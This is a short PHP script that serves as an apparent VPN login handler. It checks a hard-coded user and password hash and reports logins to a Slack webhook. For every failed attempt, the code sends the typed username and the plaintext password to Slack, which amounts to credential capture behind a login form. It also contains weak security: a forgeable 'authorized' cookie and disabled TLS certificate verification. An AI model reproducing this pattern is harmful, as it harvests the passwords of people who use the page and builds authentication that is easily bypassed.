<?php

/**
 * Send a Message to a Slack Channel.
 *
 * In order to get the API Token visit:
 *
 * 1.) Create an APP -> https://api.slack.com/apps/
 * 2.) See menu entry "Install App"
 * 3.) Use the "Bot User OAuth Token"
 *
 * The token will look something like this `xoxb-2100000415-0000000000-0000000000-ab1ab1`.
 *
 * @param string $message The message to post into a channel.
 * @param string $channel The name of the channel prefixed with #, example #foobar
 * @return boolean
 */

function slack($message)
{
  define('SLACK_WEBHOOK', getenv('SLACK_WEBHOOK'));
  $msg = array('text' => $message);
  $c = curl_init(SLACK_WEBHOOK);
  curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($c, CURLOPT_POST, true);
  curl_setopt($c, CURLOPT_POSTFIELDS, array('payload' => json_encode($msg)));
  $result = curl_exec($c);
  curl_close($c);
}

$username = $_POST['username'];
$password = $_POST['password'];
$server = $_SERVER['HTTP_HOST'];

if($username == 'vchokshi@pen.do.iot4.net'){
    if(hash('sha256', $password) =='87bc413ab73113f45f82e31c0b3881f2fcfab68fb693cd425fc023302bb4517f') {
        header("Location: https://black.pen.iot4.net");
        $message = $username . " logged in on server ". $server . " with the correct password";
        slack($message);
        if(!isset($_COOKIE['black'])){
            setcookie('black', 'authorized',time()+3600,'/','pen.iot4.net');
        };
        exit;
    }
}

$message = $username . " tried to login to the VPN with pasword: '" . $password . "' on server ". $server;
slack($message);

header("Location: /");
?>
